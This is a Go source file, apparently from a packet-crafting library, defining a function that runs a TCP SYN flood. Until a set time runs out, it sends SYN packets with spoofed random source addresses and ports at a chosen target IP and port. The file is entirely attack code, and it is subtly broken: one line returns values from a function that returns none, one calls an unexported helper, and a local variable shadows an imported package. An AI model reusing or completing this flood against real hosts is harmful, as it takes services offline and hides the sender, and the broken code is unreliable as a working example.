package higherlevel

import (
	"log"
	"time"

	packet "github.com/tiagomdiogo/GoPpy/Packet"
	utils "github.com/tiagomdiogo/GoPpy/Utils"
	"github.com/tiagomdiogo/GoPpy/supersocket"
)

func SimulateTCPSYNFlood(targetIP, targetPort, payload string, attackDuration time.Duration) {
	socket, err := supersocket.NewSuperSocket("eth0", "")
	if err != nil {
		log.Fatal(err)
	}
	defer socket.Close()

	// Define the deadline for the attack to stop.
	end := time.Now().Add(attackDuration)

	for time.Now().Before(end) {
		srcIP, err := utils.ParseIPGen("0.0.0.0/1")
		if err != nil {
			return nil, err
		}
		srcPort := utils.randomPort()
		packet, err := packet.CraftTCPPacket(srcIP, targetIP, srcPort, targetPort, payload, "SYN")
		if err != nil {
			log.Fatal(err)
		}

		err = socket.Send(packet)
		if err != nil {
			log.Fatal(err)
		}
	}
}
